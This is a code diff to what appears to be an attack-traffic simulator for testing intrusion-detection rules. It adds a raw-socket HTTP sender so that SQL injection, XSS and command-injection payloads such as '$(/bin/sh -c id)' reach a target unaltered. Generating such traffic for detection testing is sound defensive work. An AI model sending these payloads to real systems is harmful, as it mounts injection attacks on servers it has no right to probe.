@@ -58,6 +58,32 @@ def detect_sim_ip() -> str:
         return ""
 
 
+def raw_http(path: str):
+    """Send a GET whose request-target carries a raw attack payload.
+
+    urllib rejects spaces/control chars in a URL, so injection payloads
+    (SQLi/XSS/cmd-injection) can't go through http(). A raw socket puts the
+    payload on the wire verbatim — spaces percent-encoded, attack characters
+    (quotes, <>, |, ;) left literal — which is exactly what a scanner emits and
+    what ET's http.uri rules inspect. Best-effort; never raises.
+    """
+    target = path if path.startswith("/") else "/" + path
+    target = target.replace(" ", "%20")
+    req = (
+        f"GET {target} HTTP/1.1\r\n"
+        f"Host: {TARGET_IP}\r\n"
+        f"User-Agent: {UA_ATTACK}\r\n"
+        f"Accept: */*\r\n"
+        f"Connection: close\r\n\r\n"
+    )
+    try:
+        with socket.create_connection((TARGET_IP, 80), timeout=HTTP_TIMEOUT) as sock:
+            sock.sendall(req.encode("latin-1", "replace"))
+            sock.recv(1024)
+    except OSError:
+        pass
+
+
 def http(method: str, path: str, *, body: bytes = None, headers: dict = None):
     """Best-effort HTTP request; never raises, returns status int or None."""
     url = TARGET + "/" + path.lstrip("/")
@@ -113,7 +139,7 @@ def tech_sqli(_):
         "q=1%27%20OR%201=1--",
     ]
     for pl in payloads:
-        http("GET", f"search?{pl}")
+        raw_http(f"/search?{pl}")
 
 
 def tech_xss(_):
@@ -125,7 +151,7 @@ def tech_xss(_):
         "q=%3Cscript%3Ealert(1)%3C/script%3E",
     ]
     for pl in payloads:
-        http("GET", f"search?{pl}")
+        raw_http(f"/search?{pl}")
 
 
 def tech_cmdi(_):
@@ -137,7 +163,7 @@ def tech_cmdi(_):
         "file=$(/bin/sh -c id)",
     ]
     for pl in payloads:
-        http("GET", f"ping?{pl}")
+        raw_http(f"/ping?{pl}")
 
 
 def tech_brute(_):
